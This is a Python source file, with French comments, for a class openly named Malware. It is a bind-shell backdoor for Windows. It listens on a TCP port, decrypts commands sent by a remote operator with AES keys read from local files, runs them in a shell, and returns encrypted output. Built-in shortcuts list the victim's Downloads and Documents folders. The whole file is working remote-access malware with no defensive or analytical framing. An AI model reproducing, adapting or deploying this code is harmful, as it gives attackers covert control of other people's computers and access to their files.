import socket
import os
import subprocess
from Crypto.Cipher import AES
import getpass


class Malware:
    def __init__(self, host ='', port=50900):
        self.host = host
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.working_directory = os.getcwd()

    def get_encrypt_key(self):
        # Generation de clé AES pour le chiffrement
        with open(self.working_directory + "\mencrypt-iv.bin", "rb") as file:
            iv_aes = file.readline()
        with open(self.working_directory + "\Mencrypt-key.bin", "rb") as file:
            key_aes = file.readline()
        self.key_encrypt = AES.new(key_aes, AES.MODE_CFB, iv_aes)

    def get_decrypt_key(self):
        # Generation de clé AES pour le decryptage
        with open(self.working_directory + "\Mdecrypt-iv.bin", "rb") as file:
            iv_aes2 = file.readline()
        with open(self.working_directory + "\Mdecrypt-key.bin", "rb") as file:
            key_aes2 = file.readline()
        self.key_decrypt = AES.new(key_aes2, AES.MODE_CFB, iv_aes2)

    def socket_bind(self):
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
            self.socket_bind()

    def socket_accept(self):
        self.conn, address = self.s.accept()
        print("Connection établie | " + "IP " + address[0] + " | Port " + str(address[1]))
        self.receive_commands()
        self.conn.close()

    def send(self):
        self.output = str(self.output_bytes, "utf-8", 'ignore')
        self.encode =  self.output.encode('utf-8')
        self.encrypt = self.key_encrypt.encrypt(self.encode)

    def subprocess(self):
        self.cmd = subprocess.Popen(self.data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        self.output_bytes = self.cmd.stdout.read() + self.cmd.stderr.read()

    def receive_commands(self):
        while True:
            data = self.conn.recv(1024)
            self.get_decrypt_key()
            data = self.key_decrypt.decrypt(data)
            self.data = data.decode('utf-8', 'ignore')
            self.get_encrypt_key()

            if self.data[:2] == 'cd' and self.data[3:] != '':
                os.chdir(self.data[3:])
                actual_directory = os.getcwd()
                encode = actual_directory.encode('utf-8')
                encrypt_cd = self.key_encrypt.encrypt(encode)
                self.conn.send(encrypt_cd)
            elif self.data == 'Downloads':
                os.chdir(r"C:\Users\%s\Downloads" % getpass.getuser())
                self.data = 'dir'
                self.subprocess()
                self.send()
                self.conn.send(self.encrypt)
            elif self.data == 'Documents':
                os.chdir(r"C:\Users\%s\Documents" % getpass.getuser())
                self.data = 'dir'
                self.subprocess()
                self.send()
                self.conn.send(self.encrypt)
            elif self.data == 'quit':
                self.s.close()
            elif self.data[:4] == 'echo' or self.data[:4] == 'ECHO':
                self.subprocess()
                self.send()
                print(self.output)
                self.conn.send(self.encrypt)
            elif len(self.data) > 0:
                self.subprocess()
                self.send()
                self.conn.send(self.encrypt)

m = Malware()
m.socket_bind()
m.socket_accept()